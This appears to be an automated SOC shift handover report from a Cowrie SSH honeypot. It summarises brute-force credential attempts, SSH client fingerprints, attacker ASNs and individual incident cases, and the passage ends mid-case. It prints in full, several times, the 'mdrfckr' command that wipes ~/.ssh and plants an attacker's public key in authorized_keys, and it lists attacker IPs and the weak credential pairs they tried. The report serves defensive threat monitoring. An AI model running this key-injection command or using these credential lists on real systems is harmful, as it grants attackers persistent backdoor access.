# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-30 |
| **Generated At** | 2026-08-30T05:12:35Z |
| **Shift Time** | 05:12 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **201** |
| Confirmed Threats | **154** |
| False Positives Filtered | **47** (23.4%) |
| Unique Attacker IPs | **78** |
| Countries of Origin | **30** |
| High Severity Cases | **96** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **105** |
| Malware Samples Analyzed | **3** HIGH · **20** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **115** |
| Unique Credential Pairs | **62** |
| Unique Usernames | **21** |
| Unique Passwords | **53** |
| Successful Auth Pairs | **104** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 18 |
| `support` | 16 |
| `admin` | 14 |
| `ubuntu` | 13 |
| `345gs5662d34` | 10 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 10 |
| `3245gs5662d34` | 9 |
| `666666` | 6 |
| `0000000` | 6 |
| `9999999` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 10 |
| `admin` | `666666` | 6 |
| `admin` | `0000000` | 6 |
| `support` | `9999999` | 6 |
| `nobody` | `nobody444` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `admin` | `34.77.82.150` | 2026-08-30T02:57:48 |
| `user` | `4` | `113.11.34.221` | 2026-08-30T02:58:29 |
| `user` | `4` | `62.122.195.14` | 2026-08-30T02:58:36 |
| `ubuntu` | `adminadmin` | `217.60.255.130` | 2026-08-30T03:00:11 |
| `root` | `oracle@123` | `217.60.255.130` | 2026-08-30T03:03:56 |
| `admin` | `666666` | `10.0.0.73` | 2026-08-30T03:04:14 |
| `admin` | `666666` | `196.188.93.169` | 2026-08-30T03:05:31 |
| `admin` | `666666` | `36.64.36.101` | 2026-08-30T03:05:40 |
| `june` | `1` | `154.83.17.239` | 2026-08-30T03:08:52 |
| `345gs5662d34` | `345gs5662d34` | `154.83.17.239` | 2026-08-30T03:08:56 |
| `june` | `3245gs5662d34` | `154.83.17.239` | 2026-08-30T03:08:57 |
| `ubuntu` | `ht` | `217.60.255.130` | 2026-08-30T03:09:42 |
| `fran` | `fran123` | `185.180.109.243` | 2026-08-30T03:09:42 |
| `345gs5662d34` | `345gs5662d34` | `185.180.109.243` | 2026-08-30T03:09:45 |
| `fran` | `3245gs5662d34` | `185.180.109.243` | 2026-08-30T03:09:45 |
| `support` | `support` | `176.53.159.196` | 2026-08-30T03:10:55 |
| `root` | `Allah786` | `217.60.255.130` | 2026-08-30T03:14:51 |
| `lisi` | `lisi` | `107.155.56.52` | 2026-08-30T03:16:26 |
| `345gs5662d34` | `345gs5662d34` | `107.155.56.52` | 2026-08-30T03:16:30 |
| `lisi` | `3245gs5662d34` | `107.155.56.52` | 2026-08-30T03:16:32 |
| `ubuntu` | `francesca` | `217.60.255.130` | 2026-08-30T03:19:16 |
| `admin` | `666666` | `27.107.102.154` | 2026-08-30T03:20:46 |
| `admin` | `666666` | `2.249.150.53` | 2026-08-30T03:20:54 |
| `root` | `6666` | `66.45.144.201` | 2026-08-30T03:25:19 |
| `root` | `user2@2024` | `217.60.255.130` | 2026-08-30T03:25:28 |
| `root` | `6666` | `106.245.246.26` | 2026-08-30T03:25:29 |
| `root` | `6666` | `104.248.83.99` | 2026-08-30T03:25:35 |
| `root` | `6666` | `2.179.194.193` | 2026-08-30T03:25:43 |
| `ubuntu` | `enterprise` | `217.60.255.130` | 2026-08-30T03:28:46 |
| `centos` | `centos222` | `78.187.9.53` | 2026-08-30T03:30:23 |
| `centos` | `centos222` | `222.92.61.242` | 2026-08-30T03:30:32 |
| `root` | `﻿------fuck------` | `117.50.176.93` | 2026-08-30T03:30:47 |
| `webuser` | `webuser@123` | `157.15.67.253` | 2026-08-30T03:30:49 |
| `345gs5662d34` | `345gs5662d34` | `157.15.67.253` | 2026-08-30T03:30:53 |
| `webuser` | `3245gs5662d34` | `157.15.67.253` | 2026-08-30T03:30:55 |
| `station` | `station123` | `156.236.73.11` | 2026-08-30T03:31:36 |
| `345gs5662d34` | `345gs5662d34` | `156.236.73.11` | 2026-08-30T03:31:39 |
| `station` | `3245gs5662d34` | `156.236.73.11` | 2026-08-30T03:31:40 |
| `support` | `support` | `10.0.0.73` | 2026-08-30T03:34:37 |
| `admin` | `0000000` | `10.0.0.73` | 2026-08-30T03:35:54 |
| `root` | `Allen@123` | `217.60.255.130` | 2026-08-30T03:36:14 |
| `admin` | `0000000` | `220.246.42.227` | 2026-08-30T03:37:24 |
| `admin` | `0000000` | `219.143.40.210` | 2026-08-30T03:37:34 |
| `ubuntu` | `root123!` | `217.60.255.130` | 2026-08-30T03:38:16 |
| `support` | `9999999` | `10.0.0.73` | 2026-08-30T03:40:05 |
| `centos` | `centos222` | `10.0.0.73` | 2026-08-30T03:41:24 |
| `root` | `admin@12` | `217.60.255.130` | 2026-08-30T03:47:08 |
| `ubuntu` | `Hamid@2026` | `217.60.255.130` | 2026-08-30T03:47:55 |
| `asd` | `1234` | `52.233.193.61` | 2026-08-30T03:48:51 |
| `345gs5662d34` | `345gs5662d34` | `52.233.193.61` | 2026-08-30T03:48:53 |
| `asd` | `3245gs5662d34` | `52.233.193.61` | 2026-08-30T03:48:54 |
| `remote` | `P@ssw0rd123` | `103.91.246.101` | 2026-08-30T03:49:50 |
| `345gs5662d34` | `345gs5662d34` | `103.91.246.101` | 2026-08-30T03:49:55 |
| `remote` | `3245gs5662d34` | `103.91.246.101` | 2026-08-30T03:49:57 |
| `test` | `1` | `94.132.0.254` | 2026-08-30T03:49:58 |
| `345gs5662d34` | `345gs5662d34` | `94.132.0.254` | 2026-08-30T03:50:00 |
| `test` | `3245gs5662d34` | `94.132.0.254` | 2026-08-30T03:50:01 |
| `john` | `john@123` | `121.31.210.125` | 2026-08-30T03:50:26 |
| `345gs5662d34` | `345gs5662d34` | `121.31.210.125` | 2026-08-30T03:50:31 |
| `root` | `098123` | `222.110.147.58` | 2026-08-30T03:50:34 |
| `345gs5662d34` | `345gs5662d34` | `222.110.147.58` | 2026-08-30T03:50:38 |
| `root` | `3245gs5662d34` | `222.110.147.58` | 2026-08-30T03:50:39 |
| `admin` | `0000000` | `92.255.196.185` | 2026-08-30T03:52:41 |
| `admin` | `0000000` | `111.70.23.240` | 2026-08-30T03:52:50 |
| `ubuntu` | `Jafar@1234` | `217.60.255.130` | 2026-08-30T03:57:19 |
| `support` | `9999999` | `117.70.94.155` | 2026-08-30T03:57:26 |
| `support` | `9999999` | `111.70.23.245` | 2026-08-30T03:57:35 |
| `support` | `9999999` | `180.193.181.195` | 2026-08-30T03:57:36 |
| `support` | `9999999` | `119.237.15.136` | 2026-08-30T03:57:43 |
| `root` | `Black@123` | `217.60.255.130` | 2026-08-30T03:57:43 |
| `nobody` | `nobody444` | `209.145.59.90` | 2026-08-30T04:02:31 |
| `nobody` | `nobody444` | `128.185.12.179` | 2026-08-30T04:02:40 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `35.205.86.202` | 2026-08-30T04:03:05 |
| `*1` | `$4` | `35.205.86.202` | 2026-08-30T04:03:14 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 9860` | `35.205.86.202` | 2026-08-30T04:03:16 |
| `ubuntu` | `Mohsen1234` | `217.60.255.130` | 2026-08-30T04:06:52 |
| `admin` | `admin` | `165.154.226.213` | 2026-08-30T04:07:06 |
| `support` | `99` | `10.0.0.73` | 2026-08-30T04:07:54 |
| `root` | `kafka@1234` | `217.60.255.130` | 2026-08-30T04:08:31 |
| `support` | `99` | `220.80.223.144` | 2026-08-30T04:09:21 |
| `support` | `99` | `2.180.11.118` | 2026-08-30T04:09:34 |
| `supervisor` | `supervisor222` | `10.0.0.73` | 2026-08-30T04:11:53 |
| `nobody` | `nobody444` | `10.0.0.73` | 2026-08-30T04:13:34 |
| `ubuntu` | `Dariush123` | `217.60.255.130` | 2026-08-30T04:16:28 |
| `root` | `lokesh@123` | `217.60.255.130` | 2026-08-30T04:19:15 |
| `support` | `99` | `14.48.112.8` | 2026-08-30T04:24:35 |
| `support` | `99` | `120.194.50.39` | 2026-08-30T04:24:48 |
| `ubuntu` | `Javad1234` | `217.60.255.130` | 2026-08-30T04:25:53 |
| `supervisor` | `supervisor222` | `217.149.191.246` | 2026-08-30T04:29:38 |
| `nobody` | `nobody444` | `178.178.222.52` | 2026-08-30T04:29:48 |
| `root` | `openvpn@123` | `217.60.255.130` | 2026-08-30T04:30:04 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `35.205.213.88` | 2026-08-30T04:31:28 |
| `*1` | `$4` | `35.205.213.88` | 2026-08-30T04:31:42 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 228` | `35.205.213.88` | 2026-08-30T04:31:44 |
| `test` | `777` | `182.52.133.240` | 2026-08-30T04:34:28 |
| `test` | `777` | `59.188.114.121` | 2026-08-30T04:34:36 |
| `ubuntu` | `Mahmoud@123` | `217.60.255.130` | 2026-08-30T04:35:29 |
| `supervisor` | `supervisor2021` | `10.0.0.73` | 2026-08-30T04:39:37 |
| `root` | `u@123` | `217.60.255.130` | 2026-08-30T04:40:52 |
| `supervisor` | `supervisor2021` | `210.177.143.61` | 2026-08-30T04:41:12 |
| `ubuntu` | `Majid@123` | `217.60.255.130` | 2026-08-30T04:45:08 |
| `test` | `777` | `10.0.0.73` | 2026-08-30T04:45:20 |
| `root` | `1Qaz2wsx3e` | `217.60.255.130` | 2026-08-30T04:51:31 |
| `ubuntu` | `Arash@1234` | `217.60.255.130` | 2026-08-30T04:54:29 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **201** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 60 |
| OpenSSH | 32 |
| Go SSH scanner | 6 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 32 | 31 |
| `f555226df196...` | Mirai/variant | 28 | 10 |
| `419da4c91ddb...` | Modern SSH client | 24 | 1 |
| `03a80b21afa8...` | Modern SSH client | 3 | 2 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 32 | 31 | Mirai/variant |
| `f555226df196...` | libssh | 28 | 10 | Mirai/variant |
| `419da4c91ddb...` | libssh | 24 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 5 | 1 | — |
| `03a80b21afa8...` | libssh | 3 | 2 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `4e066189c3bb...` | Unknown | 1 | 1 | Generic scanner |
| `dde267e50f82...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 10 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `185.180.109.243`, `156.236.73.11`, `52.233.193.61`, `154.83.17.239`, `94.132.0.254`, `121.31.210.125`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **78** |
| Unique ASNs | **58** |
| High-Risk ASNs | **48** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 7 | HIGH |
| `AS396982` | Google LLC | 6 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS17421` | Mobile Business Group | 2 | HIGH |
| `AS4760` | HKT Limited | 2 | HIGH |
| `AS58224` | Iran Telecommunication Company PJS | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (96)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-0265ffb0cf84

| Field | Detail |
|---|---|
| **Source IP** | `34.77.82[.]150` |
| **First Seen** | 2026-08-30 02:57 |
| **Last Seen** | 2026-08-30 02:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 02:57:46` | `cowrie.session.connect` |
| `2026-08-30 02:57:46` | `cowrie.client.version` |
| `2026-08-30 02:57:46` | `cowrie.client.kex` |
| `2026-08-30 02:57:48` | `cowrie.login.success` |
| `2026-08-30 02:57:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.82[.]150` to AbuseIPDB if not already reported
- [ ] Block `34.77.82[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-790978d3d295

| Field | Detail |
|---|---|
| **Source IP** | `113.11.34[.]221` |
| **First Seen** | 2026-08-30 02:58 |
| **Last Seen** | 2026-08-30 02:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 02:58:26` | `cowrie.session.connect` |
| `2026-08-30 02:58:26` | `cowrie.client.version` |
| `2026-08-30 02:58:26` | `cowrie.client.kex` |
| `2026-08-30 02:58:29` | `cowrie.login.success` |
| `2026-08-30 02:58:29` | `cowrie.direct-tcpip.request` |
| `2026-08-30 02:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.11.34[.]221` to AbuseIPDB if not already reported
- [ ] Block `113.11.34[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f0a85ec482e

| Field | Detail |
|---|---|
| **Source IP** | `62.122.195[.]14` |
| **First Seen** | 2026-08-30 02:58 |
| **Last Seen** | 2026-08-30 02:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 02:58:34` | `cowrie.session.connect` |
| `2026-08-30 02:58:35` | `cowrie.client.version` |
| `2026-08-30 02:58:35` | `cowrie.client.kex` |
| `2026-08-30 02:58:36` | `cowrie.login.success` |
| `2026-08-30 02:58:36` | `cowrie.direct-tcpip.request` |
| `2026-08-30 02:58:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.122.195[.]14` to AbuseIPDB if not already reported
- [ ] Block `62.122.195[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fc57c41e5bf

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 03:00 |
| **Last Seen** | 2026-08-30 03:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:00:10` | `cowrie.session.connect` |
| `2026-08-30 03:00:10` | `cowrie.client.version` |
| `2026-08-30 03:00:10` | `cowrie.client.kex` |
| `2026-08-30 03:00:11` | `cowrie.login.success` |
| `2026-08-30 03:00:11` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:00:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 03:00:12` | `cowrie.direct-tcpip.data` |
| `2026-08-30 03:00:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a21630c25a2d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 03:03 |
| **Last Seen** | 2026-08-30 03:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:03:55` | `cowrie.session.connect` |
| `2026-08-30 03:03:55` | `cowrie.client.version` |
| `2026-08-30 03:03:55` | `cowrie.client.kex` |
| `2026-08-30 03:03:56` | `cowrie.login.success` |
| `2026-08-30 03:03:56` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:03:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 03:03:56` | `cowrie.direct-tcpip.data` |
| `2026-08-30 03:03:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5f648a65094

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-08-30 03:05 |
| **Last Seen** | 2026-08-30 03:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:05:29` | `cowrie.session.connect` |
| `2026-08-30 03:05:30` | `cowrie.client.version` |
| `2026-08-30 03:05:30` | `cowrie.client.kex` |
| `2026-08-30 03:05:31` | `cowrie.login.success` |
| `2026-08-30 03:05:31` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c25442c9fa5e

| Field | Detail |
|---|---|
| **Source IP** | `36.64.36[.]101` |
| **First Seen** | 2026-08-30 03:05 |
| **Last Seen** | 2026-08-30 03:05 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:05:37` | `cowrie.session.connect` |
| `2026-08-30 03:05:37` | `cowrie.client.version` |
| `2026-08-30 03:05:37` | `cowrie.client.kex` |
| `2026-08-30 03:05:40` | `cowrie.login.success` |
| `2026-08-30 03:05:41` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:05:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.36[.]101` to AbuseIPDB if not already reported
- [ ] Block `36.64.36[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01117f677223

| Field | Detail |
|---|---|
| **Source IP** | `154.83.17[.]239` |
| **First Seen** | 2026-08-30 03:08 |
| **Last Seen** | 2026-08-30 03:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:08:51` | `cowrie.session.connect` |
| `2026-08-30 03:08:51` | `cowrie.client.version` |
| `2026-08-30 03:08:51` | `cowrie.client.kex` |
| `2026-08-30 03:08:52` | `cowrie.login.success` |
| `2026-08-30 03:08:53` | `cowrie.session.params` |
| `2026-08-30 03:08:53` | `cowrie.command.input` |
| `2026-08-30 03:08:53` | `cowrie.command.failed` |
| `2026-08-30 03:08:53` | `cowrie.log.closed` |
| `2026-08-30 03:08:54` | `cowrie.session.params` |
| `2026-08-30 03:08:54` | `cowrie.command.input` |
| `2026-08-30 03:08:54` | `cowrie.session.file_download` |
| `2026-08-30 03:08:54` | `cowrie.log.closed` |
| `2026-08-30 03:08:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.17[.]239` to AbuseIPDB if not already reported
- [ ] Block `154.83.17[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfd1b2b353f1

| Field | Detail |
|---|---|
| **Source IP** | `154.83.17[.]239` |
| **First Seen** | 2026-08-30 03:08 |
| **Last Seen** | 2026-08-30 03:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:08:55` | `cowrie.session.connect` |
| `2026-08-30 03:08:55` | `cowrie.client.version` |
| `2026-08-30 03:08:55` | `cowrie.client.kex` |
| `2026-08-30 03:08:56` | `cowrie.login.success` |
| `2026-08-30 03:08:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.17[.]239` to AbuseIPDB if not already reported
- [ ] Block `154.83.17[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43e638187ec2

| Field | Detail |
|---|---|
| **Source IP** | `154.83.17[.]239` |
| **First Seen** | 2026-08-30 03:08 |
| **Last Seen** | 2026-08-30 03:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:08:56` | `cowrie.session.connect` |
| `2026-08-30 03:08:56` | `cowrie.client.version` |
| `2026-08-30 03:08:56` | `cowrie.client.kex` |
| `2026-08-30 03:08:57` | `cowrie.login.success` |
| `2026-08-30 03:08:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.17[.]239` to AbuseIPDB if not already reported
- [ ] Block `154.83.17[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb073830545d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 03:09 |
| **Last Seen** | 2026-08-30 03:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:09:41` | `cowrie.session.connect` |
| `2026-08-30 03:09:41` | `cowrie.client.version` |
| `2026-08-30 03:09:41` | `cowrie.client.kex` |
| `2026-08-30 03:09:42` | `cowrie.login.success` |
| `2026-08-30 03:09:42` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:09:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 03:09:42` | `cowrie.direct-tcpip.data` |
| `2026-08-30 03:09:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e34207cc9b5c

| Field | Detail |
|---|---|
| **Source IP** | `185.180.109[.]243` |
| **First Seen** | 2026-08-30 03:09 |
| **Last Seen** | 2026-08-30 03:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:09:42` | `cowrie.session.connect` |
| `2026-08-30 03:09:42` | `cowrie.client.version` |
| `2026-08-30 03:09:42` | `cowrie.client.kex` |
| `2026-08-30 03:09:42` | `cowrie.login.success` |
| `2026-08-30 03:09:43` | `cowrie.session.params` |
| `2026-08-30 03:09:43` | `cowrie.command.input` |
| `2026-08-30 03:09:43` | `cowrie.command.failed` |
| `2026-08-30 03:09:43` | `cowrie.log.closed` |
| `2026-08-30 03:09:44` | `cowrie.session.params` |
| `2026-08-30 03:09:44` | `cowrie.command.input` |
